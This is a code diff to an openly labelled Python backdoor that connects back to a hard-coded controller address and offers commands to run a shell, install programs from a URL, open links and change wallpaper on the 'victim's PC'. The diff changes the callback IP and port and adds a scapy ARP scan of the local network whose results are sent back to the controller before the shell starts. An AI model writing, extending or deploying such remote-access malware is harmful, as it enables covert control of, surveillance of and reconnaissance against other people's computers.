@@ -4,6 +4,7 @@ import sys
 import socket
 import subprocess
 import time
+import json
 import psutil
 import ctypes
 import pynput
@@ -11,6 +12,7 @@ import shutil
 import requests
 import webbrowser
 import pyautogui
+from scapy.all import *
 from requests import get    
 from termcolor import colored
 from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -23,11 +25,23 @@ from cv2 import imshow, imwrite, destroyWindow, waitKey
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-ip = "192.168.1.7"
-port = 4445
+ip = "192.168.1.6"
+port = 4444
 ipadd = get('https://api.ipify.org').text
 
 class back:
+    def getaway_mac(self):
+        arp = ARP(pdst="192.168.1.1/24")
+        eth = Ether(dst="ff:ff:ff:ff:ff:ff")
+        a = eth/arp
+        answer = srp(a, timeout=1, verbose=False)[0]
+        count = 0
+        
+        for element in answer:
+            js = colored(f"\n{count} ==>:  {element[1].psrc}: {element[1].hwsrc}\n", "green")
+            s.send(js.encode())
+            count += 1
+
     def help_desk(self):
         self.help_ = ("=================================================================================\n"+
                     "|| 1.) bye                         -- To close the session.                     ||\n"+
@@ -38,7 +52,7 @@ class back:
                     "|| 6.) install -url                -- To install any program.                   ||\n"+
                     "|| 7.) open -link                  -- To open any url on victim's PC.           ||\n"+
                     "|| 8.) wallpaper -path             -- Changes the wallpaper of the victim's PC. ||\n"+
-                    "=================================================================================\n")
+                    "=================================================================================\n")          
         s.send(self.help_.encode())
 
     def screenshot(self, url):
@@ -186,7 +200,7 @@ class back:
                      "|| help     -- Shows extra commands         || \n"+
                      "==============================================\n")
         s.send(banner.encode())
-
+        self.getaway_mac()
         self.shell()
 
 backdoor = back()
